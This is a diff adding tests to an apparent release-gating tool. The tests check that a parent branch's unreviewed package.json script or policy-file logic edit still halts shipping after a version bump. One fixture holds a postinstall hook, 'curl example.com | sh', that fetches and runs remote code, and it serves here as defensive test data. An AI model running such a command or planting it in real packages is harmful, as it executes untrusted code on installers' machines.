@@ -131,6 +131,31 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
     expect([k.status, lineOf(k.stdout, 'STOP')]).toEqual([3, behaviorStop('src/shared.ts')]);
   });
 
+  // Value: protects=a parent package.json script main never received still stops after the child's version bump moves the
+  //   manifest into the changed-since-review set, and a parent's logic edit to a stamp_paths file main never received stops
+  //   (red-team fc3 on #4013); fails_when=a shipped path's release-metadata class is judged against the reviewed tree, or
+  //   stamp_paths count as metadata wholesale; seam=route's base-judged class and finishStages' baseRelease
+  test('a version bump does not hide a parent script main does not hold', () => {
+    const PKG = '{"name":"fx","version":"1.0.0"}\n';
+    const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
+    const bumped = stacked({ parentFiles: { ...PARENT, 'package.json': POSTINSTALL }, afterLand: g => g.advanceBase({ 'package.json': PKG }) });
+    bumped.f.write({ 'package.json': POSTINSTALL.replace('1.0.0', '1.0.1'), VERSION: '1.0.1.0\n' }); bumped.f.commit('bump');
+    const b = finish(bumped.f, bumped.reviewed, bumped.post, ['--reviewed-base', bumped.parent]);
+    expect([b.status, lineOf(b.stdout, 'STOP')]).toEqual([3, behaviorStop('package.json')]);
+  });
+
+  test('a parent logic edit to a stamp_paths file main does not hold stops', () => {
+    const policy = JSON.stringify({ min_gstack_version: '1.95.0.0', stamp_paths: ['src/policy.ts'] });
+    const stamped = stacked({
+      base: { ...BASE, '.gstack/ship-policy.json': policy, 'src/policy.ts': 'export const allow = () => false;\n' },
+      parentFiles: { ...PARENT, 'src/policy.ts': 'export const allow = () => true;\n' },
+      afterLand: g => g.advanceBase({ 'src/policy.ts': 'export const allow = () => false;\n' }),
+    });
+    expect(stamped.f.git('show', 'HEAD:src/policy.ts').stdout).toBe('export const allow = () => true;\n');
+    const s = finish(stamped.f, stamped.reviewed, stamped.post, ['--reviewed-base', stamped.parent]);
+    expect([s.status, lineOf(s.stdout, 'STOP')]).toEqual([3, behaviorStop('src/policy.ts')]);
+  });
+
   // Value: protects=a reviewed executable bit reverted to main's mode after review is not held by main, so it stops
   //   (outside voice on #4013); fails_when=baseHolds compares blob bytes only; seam=lib/ship-patch.ts baseHolds
   test('a reverted mode change stops', () => {
